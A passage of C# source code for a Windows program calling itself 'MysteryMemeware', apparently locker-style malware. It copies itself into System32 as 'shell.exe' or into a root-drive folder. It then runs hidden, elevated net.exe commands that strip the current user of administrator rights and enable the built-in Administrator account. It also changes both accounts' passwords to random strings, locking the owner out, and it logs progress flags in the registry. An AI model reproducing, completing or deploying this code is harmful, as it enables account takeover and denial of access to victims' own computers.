                    system32Path = potentialSystem32Path;
                }
                catch
                {
                    debugFlag_LocateSystem32_A = true;
                    try
                    {
                        Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
                        Microsoft.Win32.RegistryKey windowsNTCurrentVersion = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
                        if(windowsNTCurrentVersion is null)
                        {
                            goto SoftExceptionThrown:
                        }
                        object systemRootObject = windowsNTCurrentVersion.GetValue("SystemRoot", null);
                        try
                        {
                            windowsNTCurrentVersion.Close();
                            windowsNTCurrentVersion.Dispose();
                        }
                        catch
                        {
                            debugFlag_LocateSystem32_B_0 = true;
                        }
                        try
                        {
                            localMachine.Close();
                            localMachine.Dispose();
                        }
                        catch
                        {
                            debugFlag_LocateSystem32_B_1 = true;
                        }
                        if (systemRootObject.GetType() != typeof(string))
                        {
                            debugFlag_LocateSystem32_B_2 = true;
                            goto SoftExceptionThrown;
                        }
                        string systemRootString = (string)systemRootObject;
                        try
                        {
                            if (systemRootString[systemRootString.Length - 1] is '\\' || systemRootString[systemRootString.Length - 1] is '/')
                            {
                                systemRootString = systemRootString.Substring(0, systemRootString.Length - 1);
                            }
                        }
                        catch
                        {
                            debugFlag_LocateSystem32_B_3 = true;
                        }
                        string potentialSystem32Path = systemRootString + "\\system32";
                        try
                        {
                            potentialSystem32Path = new System.IO.DirectoryInfo(potentialSystem32Path).FullName;
                        }
                        catch
                        {
                            debugFlag_LocateSystem32_B_4 = true;
                        }
                        if (System.IO.Directory.Exists(potentialSystem32Path))
                        {
                            debugFlag_LocateSystem32_B_5 = true;
                            goto SoftExceptionThrown;
                        }
                        system32Path = potentialSystem32Path;
                    }
                    catch
                    {
                        debugFlag_LocateSystem32_B = true;
                        try
                        {
                            if (!System.IO.Directory.Exists("C:\\Windows\\system32"))
                            {
                                debugFlag_LocateSystem32_C_0 = true;
                                goto SoftExceptionThrown;
                            }
                            system32Path = "C:\\Windows\\system32";
                        }
                        catch
                        {
                            debugFlag_LocateSystem32_C = true;
                        }
                    }
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_LocateSystem32_A", debugFlag_LocateSystem32_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_A_0", debugFlag_LocateSystem32_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_A_1", debugFlag_LocateSystem32_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_A_2", debugFlag_LocateSystem32_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B", debugFlag_LocateSystem32_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_0", debugFlag_LocateSystem32_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_1", debugFlag_LocateSystem32_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_2", debugFlag_LocateSystem32_B_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_3", debugFlag_LocateSystem32_B_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_4", debugFlag_LocateSystem32_B_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_B_5", debugFlag_LocateSystem32_B_5.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_C", debugFlag_LocateSystem32_C.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateSystem32_C_0", debugFlag_LocateSystem32_C_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion

            #region LocateRoot

            #region DebugFlags
            bool debugFlag_LocateRoot = false;

            bool debugFlag_LocateRoot_A = false;
            bool debugFlag_LocateRoot_A_0 = false;
            bool debugFlag_LocateRoot_A_1 = false;
            bool debugFlag_LocateRoot_A_2 = false;
            bool debugFlag_LocateRoot_A_3 = false;
            bool debugFlag_LocateRoot_A_4 = false;
            bool debugFlag_LocateRoot_A_5 = false;

            bool debugFlag_LocateRoot_B = false;
            bool debugFlag_LocateRoot_B_0 = false;

            bool debugFlag_LocateRoot_C = false;
            bool debugFlag_LocateRoot_C_0 = false;
            #endregion

            string rootDrivePath = null;

            try
            {
                if (system32Path is null)
                {
                    debugFlag_LocateRoot_A_0 = true;

                    throw null;
                }

                string potentialRootDrivePath = new System.IO.DriveInfo(system32Path).Name;

                try
                {
                    if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.DirectorySeparatorChar && potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.AltDirectorySeparatorChar)
                    {
                        try
                        {
                            if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] != System.IO.Path.VolumeSeparatorChar)
                            {
                                potentialRootDrivePath += new string(new char[1] { System.IO.Path.VolumeSeparatorChar });
                            }
                        }
                        catch
                        {
                            debugFlag_LocateRoot_A_1 = true;
                        }

                        potentialRootDrivePath += new string(new char[1] { System.IO.Path.DirectorySeparatorChar });
                    }
                }
                catch
                {
                    debugFlag_LocateRoot_A_2 = true;

                    try
                    {
                        if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '\\' && potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not '/')
                        {
                            try
                            {
                                if (potentialRootDrivePath[potentialRootDrivePath.Length - 1] is not ':')
                                {
                                    potentialRootDrivePath += ":";
                                }
                            }
                            catch
                            {
                                debugFlag_LocateRoot_A_3 = true;
                            }

                            potentialRootDrivePath += "\\";
                        }
                    }
                    catch
                    {
                        debugFlag_LocateRoot_A_4 = true;
                    }
                }

                if (System.IO.Directory.Exists(potentialRootDrivePath))
                {
                    debugFlag_LocateRoot_A_5 = true;

                    throw null;
                }

                rootDrivePath = potentialRootDrivePath;
            }
            catch
            {
                debugFlag_LocateRoot_A = true;

                try
                {
                    string potentialRootDrivePath = new string(new char[3] { 'C', System.IO.Path.VolumeSeparatorChar, System.IO.Path.DirectorySeparatorChar });

                    if (System.IO.Directory.Exists(potentialRootDrivePath))
                    {
                        debugFlag_LocateRoot_B_0 = true;

                        throw null;
                    }

                    rootDrivePath = potentialRootDrivePath;
                }
                catch
                {
                    debugFlag_LocateRoot_B = true;

                    try
                    {
                        if (System.IO.Directory.Exists("C:\\"))
                        {
                            debugFlag_LocateRoot_C_0 = true;
                        }

                        rootDrivePath = "C:\\";
                    }
                    catch
                    {
                        debugFlag_LocateRoot_C = true;

                        debugFlag_LocateRoot = true;
                    }
                }
            }

            #endregion

            //rap
            #region LocateExe
            string currentExecutablePath = null;
            {
                #region DebugFlags
                bool debugFlag_LocateExe_A = false;
                bool debugFlag_LocateExe_A_0 = false;
                bool debugFlag_LocateExe_A_1 = false;

                bool debugFlag_LocateExe_B = false;
                bool debugFlag_LocateExe_B_0 = false;
                bool debugFlag_LocateExe_B_1 = false;
                #endregion
                try
                {
                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {
                        debugFlag_LocateExe_A_0 = true;
                    }
                    if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        debugFlag_LocateExe_A_1 = true;
                        goto SoftExceptionThrown;
                    }
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                catch
                {
                    debugFlag_LocateExe_A = true;
                    try
                    {
                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                        try
                        {
                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                        }
                        catch
                        {
                            debugFlag_LocateExe_B_0 = true;
                        }
                        if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                        {
                            debugFlag_LocateExe_B_1 = true;
                            goto SoftExceptionThrown;
                        }
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    catch
                    {
                        debugFlag_LocateExe_B = true;
                    }
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion

            #region Install

            #region DebugFlags
            bool debugFlag_Install = false;

            bool debugFlag_Install_A = false;
            bool debugFlag_Install_A_0 = false;
            bool debugFlag_Install_A_1 = false;

            bool debugFlag_Install_B = false;
            bool debugFlag_Install_B_0 = false;
            bool debugFlag_Install_B_1 = false;

            bool debugFlag_Install_C = false;
            bool debugFlag_Install_C_0 = false;
            bool debugFlag_Install_C_1 = false;
            bool debugFlag_Install_C_2 = false;

            bool debugFlag_Install_D = false;
            bool debugFlag_Install_D_0 = false;

            bool debugFlag_Install_E = false;
            bool debugFlag_Install_E_0 = false;

            bool debugFlag_Install_F = false;
            bool debugFlag_Install_F_0 = false;
            bool debugFlag_Install_F_1 = false;

            bool debugFlag_Install_G = false;
            bool debugFlag_Install_G_0 = false;
            #endregion

            string installLocation = null;

            try
            {
                if (currentExecutablePath is null)
                {
                    debugFlag_Install_A_0 = true;

                    throw null;
                }

                if (system32Path is null)
                {
                    debugFlag_Install_A_1 = true;

                    throw null;
                }

                string potentialInstallLocation = system32Path + "\\shell.exe";

                System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                installLocation = potentialInstallLocation;
            }
            catch
            {
                debugFlag_Install_A = true;

                try
                {
                    if (currentExecutablePath is null)
                    {
                        debugFlag_Install_B_0 = true;

                        throw null;
                    }

                    if (rootDrivePath is null)
                    {
                        debugFlag_Install_B_1 = true;

                        throw null;
                    }

                    string potentialInstallLocation = rootDrivePath + "MysteryMemeware.exe";

                    System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                    installLocation = potentialInstallLocation;
                }
                catch
                {
                    debugFlag_Install_B = true;

                    try
                    {
                        if (currentExecutablePath is null)
                        {
                            debugFlag_Install_C_0 = true;

                            throw null;
                        }

                        if (rootDrivePath is null)
                        {
                            debugFlag_Install_C_1 = true;

                            throw null;
                        }

                        string containingFolderPath = rootDrivePath + "MysteryMemeware";

                        try
                        {
                            System.IO.Directory.CreateDirectory(containingFolderPath);
                        }
                        catch
                        {
                            debugFlag_Install_C_2 = true;
                        }

                        string potentialInstallLocation = containingFolderPath + "\\MysteryMemeware.exe";

                        System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                        installLocation = potentialInstallLocation;
                    }
                    catch
                    {
                        debugFlag_Install_C = true;

                        try
                        {
                            if (currentExecutablePath is null)
                            {
                                debugFlag_Install_D_0 = true;

                                throw null;
                            }

                            System.IO.File.Copy(currentExecutablePath, "C:\\Windows\\System32\\shell.exe", true);

                            installLocation = "C:\\Windows\\System32\\shell.exe";
                        }
                        catch
                        {
                            debugFlag_Install_D = true;

                            try
                            {
                                if (currentExecutablePath is null)
                                {
                                    debugFlag_Install_E_0 = true;

                                    throw null;
                                }

                                System.IO.File.Copy(currentExecutablePath, "C:\\MysteryMemeware.exe", true);

                                installLocation = "C:\\MysteryMemeware.exe";
                            }
                            catch
                            {
                                debugFlag_Install_E = true;

                                try
                                {
                                    if (currentExecutablePath is null)
                                    {
                                        debugFlag_Install_F_0 = true;

                                        throw null;
                                    }

                                    try
                                    {
                                        System.IO.Directory.CreateDirectory("C:\\MysteryMemeware");
                                    }
                                    catch
                                    {
                                        debugFlag_Install_F_1 = true;
                                    }

                                    string potentialInstallLocation = "C:\\MysteryMemeware\\MysteryMemeware.exe";

                                    System.IO.File.Copy(currentExecutablePath, potentialInstallLocation, true);

                                    installLocation = potentialInstallLocation;
                                }
                                catch
                                {
                                    debugFlag_Install_F = true;

                                    try
                                    {
                                        if (currentExecutablePath is null)
                                        {
                                            debugFlag_Install_G_0 = true;

                                            throw null;
                                        }

                                        installLocation = currentExecutablePath;
                                    }
                                    catch
                                    {
                                        debugFlag_Install_G = true;

                                        debugFlag_Install = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            #endregion

            #region GetUsername

            #region DebugFlags
            bool debugFlag_GetUsername = false;

            bool debugFlag_GetUsername_A = false;
            bool debugFlag_GetUsername_A_0 = false;

            bool debugFlag_GetUsername_B = false;
            bool debugFlag_GetUsername_B_0 = false;
            bool debugFlag_GetUsername_B_1 = false;

            bool debugFlag_GetUsername_C = false;
            #endregion

            string username = null;

            try
            {
                string potentialUsername = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

                try
                {
                    for (int i = potentialUsername.Length - 1; i >= 0; i--)
                    {
                        if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
                        {
                            potentialUsername = potentialUsername.Substring(0, i);

                            break;
                        }
                    }
                }
                catch
                {
                    debugFlag_GetUsername_A_0 = true;
                }

                username = potentialUsername;
            }
            catch
            {
                debugFlag_GetUsername_A = true;

                try
                {
                    string potentialUsername = System.Environment.UserName;

                    if (potentialUsername is null)
                    {
                        debugFlag_GetUsername_B_0 = true;

                        throw null;
                    }

                    try
                    {
                        for (int i = potentialUsername.Length - 1; i >= 0; i--)
                        {
                            if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
                            {
                                potentialUsername = potentialUsername.Substring(0, i);

                                break;
                            }
                        }
                    }
                    catch
                    {
                        debugFlag_GetUsername_B_1 = true;
                    }

                    username = potentialUsername;
                }
                catch
                {
                    debugFlag_GetUsername_B = true;

                    try
                    {
                        username = "Administrator";
                    }
                    catch
                    {
                        debugFlag_GetUsername_C = true;

                        debugFlag_GetUsername = true;
                    }
                }
            }

            #endregion

            #region EnableUser

            #region DebugFlags
            bool debugFlag_EnableUser = false;

            bool debugFlag_EnableUser_A = false;
            bool debugFlag_EnableUser_A_0 = false;
            bool debugFlag_EnableUser_A_1 = false;
            bool debugFlag_EnableUser_A_2 = false;
            bool debugFlag_EnableUser_A_3 = false;
            bool debugFlag_EnableUser_A_4 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_EnableUser_A_0 = false;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableUserStartInfo.Arguments = "user \"" + username + "\" /active:yes";
                enableUserStartInfo.CreateNoWindow = true;
                enableUserStartInfo.Domain = null;
                enableUserStartInfo.ErrorDialog = false;
                enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    enableUserStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableUserStartInfo.FileName = "net.exe";
                }

                enableUserStartInfo.LoadUserProfile = false;
                enableUserStartInfo.Password = null;
                enableUserStartInfo.PasswordInClearText = null;
                enableUserStartInfo.RedirectStandardError = false;
                enableUserStartInfo.RedirectStandardInput = false;
                enableUserStartInfo.RedirectStandardOutput = false;
                enableUserStartInfo.StandardErrorEncoding = null;
                enableUserStartInfo.StandardOutputEncoding = null;
                enableUserStartInfo.UserName = null;
                enableUserStartInfo.UseShellExecute = false;
                enableUserStartInfo.Verb = "runas";
                enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    enableUserStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableUserStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_EnableUser_A_1 = false;
                }

                while (!enableUserProcess.HasExited)
                {
                    bool timedOut = false;


                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_EnableUser_A_2 = false;
                    }

                    if (timedOut)
                    {
                        debugFlag_EnableUser_A_3 = false;

                        throw null;
                    }
                }

                if (enableUserProcess.ExitCode is not 0)
                {
                    debugFlag_EnableUser_A_4 = false;

                    throw null;
                }
            }
            catch
            {
                debugFlag_EnableUser_A = true;

                debugFlag_EnableUser = true;
            }

            #endregion

            #region UnadminUser

            #region DebugFlags
            bool debugFlag_UnadminUser = false;

            bool debugFlag_UnadminUser_A = false;
            bool debugFlag_UnadminUser_A_0 = false;
            bool debugFlag_UnadminUser_A_1 = false;
            bool debugFlag_UnadminUser_A_2 = false;
            bool debugFlag_UnadminUser_A_3 = false;
            bool debugFlag_UnadminUser_A_4 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_UnadminUser_A_0 = true;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo unadminUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                unadminUserStartInfo.Arguments = "net localgroup \"Administrators\" /delete \"" + username + "\"";
                unadminUserStartInfo.CreateNoWindow = true;
                unadminUserStartInfo.Domain = null;
                unadminUserStartInfo.ErrorDialog = false;
                unadminUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    unadminUserStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    unadminUserStartInfo.FileName = "net.exe";
                }

                unadminUserStartInfo.LoadUserProfile = false;
                unadminUserStartInfo.Password = null;
                unadminUserStartInfo.PasswordInClearText = null;
                unadminUserStartInfo.RedirectStandardError = false;
                unadminUserStartInfo.RedirectStandardInput = false;
                unadminUserStartInfo.RedirectStandardOutput = false;
                unadminUserStartInfo.StandardErrorEncoding = null;
                unadminUserStartInfo.StandardOutputEncoding = null;
                unadminUserStartInfo.UserName = null;
                unadminUserStartInfo.UseShellExecute = false;
                unadminUserStartInfo.Verb = "runas";
                unadminUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    unadminUserStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    unadminUserStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process unadminUserProcess = System.Diagnostics.Process.Start(unadminUserStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_UnadminUser_A_1 = true;
                }

                while (!unadminUserProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_UnadminUser_A_2 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_UnadminUser_A_3 = true;

                        throw null;
                    }
                }

                if (unadminUserProcess.ExitCode is not 0)
                {
                    debugFlag_UnadminUser_A_4 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_UnadminUser_A = true;

                debugFlag_UnadminUser = true;
            }

            #endregion

            #region EnableAdmin

            #region DebugFlags
            bool debugFlag_EnableAdmin = false;

            bool debugFlag_EnableAdmin_A = false;
            bool debugFlag_EnableAdmin_A_0 = false;
            bool debugFlag_EnableAdmin_A_1 = false;
            bool debugFlag_EnableAdmin_A_2 = false;
            bool debugFlag_EnableAdmin_A_3 = false;
            #endregion

            try
            {
                System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                enableAdminStartInfo.CreateNoWindow = true;
                enableAdminStartInfo.Domain = null;
                enableAdminStartInfo.ErrorDialog = false;
                enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    enableAdminStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableAdminStartInfo.FileName = "net.exe";
                }

                enableAdminStartInfo.LoadUserProfile = false;
                enableAdminStartInfo.Password = null;
                enableAdminStartInfo.PasswordInClearText = null;
                enableAdminStartInfo.RedirectStandardError = false;
                enableAdminStartInfo.RedirectStandardInput = false;
                enableAdminStartInfo.RedirectStandardOutput = false;
                enableAdminStartInfo.StandardErrorEncoding = null;
                enableAdminStartInfo.StandardOutputEncoding = null;
                enableAdminStartInfo.UserName = null;
                enableAdminStartInfo.UseShellExecute = false;
                enableAdminStartInfo.Verb = "runas";
                enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    enableAdminStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableAdminStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_EnableAdmin_A_0 = false;
                }

                while (!enableAdminProcess.HasExited)
                {
                    bool timedOut = false;


                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_EnableAdmin_A_1 = false;
                    }

                    if (timedOut)
                    {
                        debugFlag_EnableAdmin_A_2 = false;

                        throw null;
                    }
                }

                if (enableAdminProcess.ExitCode is not 0)
                {
                    debugFlag_EnableAdmin_A_3 = false;

                    throw null;
                }
            }
            catch
            {
                debugFlag_EnableAdmin_A = true;

                debugFlag_EnableAdmin = true;
            }

            #endregion

            #region NewUserPass

            #region DebugFlags
            bool debugFlag_NewUserPass = false;

            bool debugFlag_NewUserPass_A = false;
            bool debugFlag_NewUserPass_A_0 = false;
            bool debugFlag_NewUserPass_A_1 = false;
            bool debugFlag_NewUserPass_A_2 = false;

            bool debugFlag_NewUserPass_B = false;
            #endregion

            string newUserPassword = null;

            try
            {
                System.Random RNG = null;

                try
                {
                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
                }
                catch
                {
                    debugFlag_NewUserPass_A_0 = true;

                    try
                    {
                        RNG = new System.Random();
                    }
                    catch
                    {
                        debugFlag_NewUserPass_A_1 = true;
                    }
                }

                if (RNG is null)
                {
                    debugFlag_NewUserPass_A_2 = true;

                    throw null;
                }

                char[] userPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    userPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                newUserPassword = new string(userPasswordChars);
            }
            catch
            {
                debugFlag_NewUserPass_A = true;

                try
                {
                    newUserPassword = "Password123456";
                }
                catch
                {
                    debugFlag_NewUserPass_B = true;

                    debugFlag_NewUserPass = true;
                }
            }

            #endregion

            #region CngUserPass

            #region DebugFlags
            bool debugFlag_CngUserPass = false;

            bool debugFlag_CngUserPass_A = false;
            bool debugFlag_CngUserPass_A_0 = false;
            bool debugFlag_CngUserPass_A_1 = false;
            bool debugFlag_CngUserPass_A_2 = false;
            bool debugFlag_CngUserPass_A_3 = false;
            bool debugFlag_CngUserPass_A_4 = false;
            bool debugFlag_CngUserPass_A_5 = false;
            #endregion

            try
            {
                if (username is null)
                {
                    debugFlag_CngUserPass_A_0 = true;

                    throw null;
                }

                if (newUserPassword is null)
                {
                    debugFlag_CngUserPass_A_1 = true;

                    throw null;
                }

                System.Diagnostics.ProcessStartInfo changerUserPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();

                changerUserPasswordStartInfo.Arguments = "user \"" + username + "\" \"" + newUserPassword + "\"";
                changerUserPasswordStartInfo.CreateNoWindow = true;
                changerUserPasswordStartInfo.Domain = null;
                changerUserPasswordStartInfo.ErrorDialog = false;
                changerUserPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                if (system32Path is not null)
                {
                    changerUserPasswordStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    changerUserPasswordStartInfo.FileName = "net.exe";
                }

                changerUserPasswordStartInfo.LoadUserProfile = false;
                changerUserPasswordStartInfo.Password = null;
                changerUserPasswordStartInfo.PasswordInClearText = null;
                changerUserPasswordStartInfo.RedirectStandardError = false;
                changerUserPasswordStartInfo.RedirectStandardInput = false;
                changerUserPasswordStartInfo.RedirectStandardOutput = false;
                changerUserPasswordStartInfo.StandardErrorEncoding = null;
                changerUserPasswordStartInfo.StandardOutputEncoding = null;
                changerUserPasswordStartInfo.UserName = null;
                changerUserPasswordStartInfo.UseShellExecute = false;
                changerUserPasswordStartInfo.Verb = "runas";
                changerUserPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                if (system32Path is not null)
                {
                    changerUserPasswordStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    changerUserPasswordStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changerUserPasswordStartInfo);

                System.Diagnostics.Stopwatch timeoutStopwatch = null;

                try
                {
                    timeoutStopwatch = new System.Diagnostics.Stopwatch();

                    timeoutStopwatch.Restart();
                }
                catch
                {
                    debugFlag_CngUserPass_A_2 = true;
                }

                while (!changeUserPasswordProcess.HasExited)
                {
                    bool timedOut = false;

                    try
                    {
                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                        {
                            timedOut = true;
                        }
                    }
                    catch
                    {
                        debugFlag_CngUserPass_A_3 = true;
                    }

                    if (timedOut)
                    {
                        debugFlag_CngUserPass_A_4 = true;

                        throw null;
                    }
                }

                if (changeUserPasswordProcess.ExitCode is not 0)
                {
                    debugFlag_CngUserPass_A_5 = true;

                    throw null;
                }
            }
            catch
            {
                debugFlag_CngUserPass_A = true;

                debugFlag_CngUserPass = true;
            }

            #endregion

            #region NewAdminPass

            #region DebugFlags
            bool debugFlag_NewAdminPass = false;

            bool debugFlag_NewAdminPass_A = false;
            bool debugFlag_NewAdminPass_A_0 = false;
            bool debugFlag_NewAdminPass_A_1 = false;
            bool debugFlag_NewAdminPass_A_2 = false;

            bool debugFlag_NewAdminPass_B = false;
            #endregion

            string newAdminPassword = null;

            try
            {
                System.Random RNG = null;

                try
                {
                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
                }
                catch
                {
                    debugFlag_NewAdminPass_A_0 = true;

                    try
                    {
                        RNG = new System.Random();
                    }
                    catch
                    {
                        debugFlag_NewAdminPass_A_1 = true;
                    }
                }

                if (RNG is null)
                {
                    debugFlag_NewAdminPass_A_2 = true;

                    throw null;
                }

                char[] adminPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    adminPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                newAdminPassword = new string(adminPasswordChars);
            }
            catch
            {
                debugFlag_NewAdminPass_A = true;

                try
                {
                    newAdminPassword = "Password123456";
                }
                catch
                {
                    debugFlag_NewAdminPass_B = true;

                    debugFlag_NewAdminPass = true;
                }
            }

            #endregion

            #region CngAdminPass

            #region DebugFlags
            bool debugFlag_CngAdminPass = false;

            bool debugFlag_CngAdminPass_A = false;
            bool debugFlag_CngAdminPass_A_0 = false;
            bool debugFlag_CngAdminPass_A_1 = false;
            bool debugFlag_CngAdminPass_A_2 = false;
            bool debugFlag_CngAdminPass_A_3 = false;
            bool debugFlag_CngAdminPass_A_4 = false;
            #endregion

            try
            {
                if (newAdminPassword is null)
                {
                    debugFlag_CngAdminPass_A_0 = true;

                    throw null;
